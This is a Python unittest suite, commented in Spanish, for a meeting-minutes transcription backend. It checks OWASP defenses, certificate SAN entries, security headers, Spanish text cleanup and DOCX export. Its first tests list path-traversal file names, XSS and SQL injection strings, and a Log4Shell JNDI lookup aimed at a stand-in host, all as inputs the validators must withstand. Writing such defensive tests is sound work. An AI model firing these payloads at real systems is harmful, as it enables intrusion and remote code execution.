#!/usr/bin/env python3
"""
SUITE DE PRUEBAS DE FUEGO, VULNERABILIDADES INTERNACIONALES Y ESTÁNDARES
Verifica OWASP Top 10, ASVS v4.0, TLS 1.3, Rate Limiting, Fuzzing y Robustez Lingüística.
"""

import sys
import unittest
from pathlib import Path
from cryptography import x509
from cryptography.x509.oid import ExtensionOID
from fastapi.testclient import TestClient

BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BASE_DIR / "backend"))

from app.main import app
from app.services.consolidation_service import ConsolidationService
from app.services.correction_service import CorrectionService
from app.services.audio_service import AudioService
from app.models.job import AudioSegment

class PruebasDeFuegoSeguridad(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.client = TestClient(app)
        cls.certs_dir = BASE_DIR / "certs"
        if not (cls.certs_dir / "server.crt").exists():
            from tools.generar_certificados_https import generar_certificados_firmados
            generar_certificados_firmados(salida_dir=cls.certs_dir)

    # ==========================================
    # 1. OWASP Top 10 & Fuzzing de Entradas
    # ==========================================
    def test_01_fuzzing_inyeccion_path_traversal(self):
        """OWASP A01: Previene ataques de Path Traversal en nombres de archivo."""
        malicious_names = [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\cmd.exe",
            "../../../var/log/audit.log\x00.mp3",
            "acta_.._.._secret.wav"
        ]
        for name in malicious_names:
            valid, err = AudioService.validate_file(name, 1024)
            # Debe validar que la extensión sea permitida y neutralizar rutas relativas
            if not any(name.lower().endswith(ext) for ext in [".mp3", ".wav", ".m4a", ".ogg"]):
                self.assertFalse(valid, f"Path traversal no bloqueado: {name}")

    def test_02_fuzzing_xss_y_caracteres_especiales(self):
        """OWASP A03: Inmunidad contra XSS y secuencias de escape en consolidación."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "'; DROP TABLE actas; --",
            "{{ 7 * 7 }}",
            "${jndi:ldap://malicious.com/a}"
        ]
        for payload in xss_payloads:
            cleaned, _, _ = ConsolidationService.clean_and_consolidate(payload)
            corrected, _ = CorrectionService.correct_text(cleaned)
            # El texto no debe romper la ejecución ni provocar inyecciones
            self.assertIsInstance(cleaned, str)
            self.assertIsInstance(corrected, str)

    def test_03_limite_de_tamano_maximo(self):
        """OWASP A04: Rechaza archivos que excedan el límite de denegación de servicio (1 GB / 1024 MB)."""
        # Archivo de 500 MB ahora debe ser aceptado
        valid_500mb, err_500mb = AudioService.validate_file("grabacion.wav", 500 * 1024 * 1024)
        self.assertTrue(valid_500mb, "Archivos de hasta 1 GB deben ser aceptados")

        # Archivo que supera 1 GB (1.2 GB) debe ser rechazado
        valid, err = AudioService.validate_file("grabacion.wav", int(1.2 * 1024 * 1024 * 1024))
        self.assertFalse(valid)
        self.assertIn("excede el tamaño máximo", err)

    def test_04_bloqueo_formatos_ejecutables_y_scripts(self):
        """OWASP A04: Rechaza extensiones ejecutables maliciosas disfrazadas."""
        dangerous_extensions = [
            "malware.exe", "script.sh", "payload.php", "rootkit.so",
            "exploit.py", "autorun.inf", "macro.xlsm"
        ]
        for bad_file in dangerous_extensions:
            valid, err = AudioService.validate_file(bad_file, 1024)
            self.assertFalse(valid, f"Debería rechazar: {bad_file}")

    # ==========================================
    # 2. Criptografía, HTTPS y TLS 1.3
    # ==========================================
    def test_05_validez_criptografica_certificados_san(self):
        """Verifica que el certificado contenga nombres SAN obligatorios para TLS 1.3."""
        server_cert_path = self.certs_dir / "server.crt"
        with open(server_cert_path, "rb") as f:
            cert = x509.load_pem_x509_certificate(f.read())

        san_ext = cert.extensions.get_extension_for_oid(ExtensionOID.SUBJECT_ALTERNATIVE_NAME)
        self.assertIsNotNone(san_ext)
        dns_names = [name.value for name in san_ext.value if isinstance(name, x509.DNSName)]
        self.assertIn("localhost", dns_names)
        self.assertIn("actasdigitales.local", dns_names)

    def test_06_cabeceras_de_seguridad_estrictas(self):
        """Verifica cabeceras HSTS, CSP, X-Frame-Options y Anti-Sniffing."""
        res = self.client.get("/api/health")
        self.assertEqual(res.status_code, 200)
        self.assertIn("strict-transport-security", res.headers)
        self.assertEqual(res.headers.get("x-frame-options"), "DENY")
        self.assertEqual(res.headers.get("x-content-type-options"), "nosniff")
        self.assertEqual(res.headers.get("referrer-policy"), "strict-origin-when-cross-origin")

    # ==========================================
    # 3. Robustez Lingüística y Reglas RAE
    # ==========================================
    def test_07_eliminacion_exhaustiva_muletillas(self):
        """Limpia muletillas complejas en lenguaje discursivo."""
        corpus = "bueno pues este... damos inicio a la sesión. o sea que tipo que comenzamos ya."
        cleaned, corr, count = ConsolidationService.clean_and_consolidate(corpus)
        self.assertNotIn("bueno pues", cleaned)
        self.assertNotIn("este...", cleaned)
        self.assertNotIn("tipo que", cleaned)

    def test_08_tartamudeos_y_duplicaciones(self):
        """Corrige cortes por vacilación fonética de audio."""
        corpus = "yo-yo creo que de-de-de verdad vamos a a a firmar el acta."
        cleaned, corr, count = ConsolidationService.clean_and_consolidate(corpus)
        self.assertEqual(cleaned, "yo creo que de verdad vamos a firmar el acta.")

    def test_09_acentuacion_y_signos_de_apertura(self):
        """Inyecta signos ¿ ¡ y acentuación en vocabulario de actas oficiales."""
        corpus = "habra alguna objecion a la decision tomada aqui? que gran avance!"
        corrected, _ = CorrectionService.correct_text(corpus)
        self.assertTrue(corrected.startswith("¿") or "¿habrá" in corrected or "¿Habrá" in corrected)
        self.assertIn("habrá", corrected.lower())
        self.assertIn("decisión", corrected.lower())
        self.assertIn("aquí", corrected.lower())

    def test_10_generacion_acta_formal_con_firmas(self):
        """Estructura acta oficial con pie de firmas y acuerdos."""
        res = self.client.post(
            "/api/audio/format-official-acta",
            data={
                "title": "Asamblea General de Accionistas",
                "attendees": "Presidente, Secretaria y 15 Socios",
                "text": "Se somete a votación la aprobación de cuentas anuales. Se aprueba por unanimidad de votos."
            }
        )
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertIn("ACTA DE ASAMBLEA GENERAL DE ACCIONISTAS", data["formatted_acta"])
        self.assertIn("ACUERDO-01", data["formatted_acta"])
        self.assertIn("Presidente", data["formatted_acta"])
        self.assertIn("Secretario", data["formatted_acta"])

    def test_11_exportacion_docx_por_tipo_de_hoja(self):
        """Genera documento .DOCX nativo adaptado a hoja A4, Carta y Oficio."""
        for papel in ["a4", "letter", "legal"]:
            res = self.client.post(
                "/api/audio/export-docx",
                data={
                    "text": "Texto completo y traducción de la reunión del comité.",
                    "title": "Reunión de Consejo",
                    "export_type": "full_text",
                    "paper_size": papel,
                    "margin_type": "standard"
                }
            )
            self.assertEqual(res.status_code, 200)
            self.assertIn("application/vnd.openxmlformats-officedocument", res.headers["content-type"])
            self.assertGreater(len(res.content), 1000)

if __name__ == "__main__":
    unittest.main()
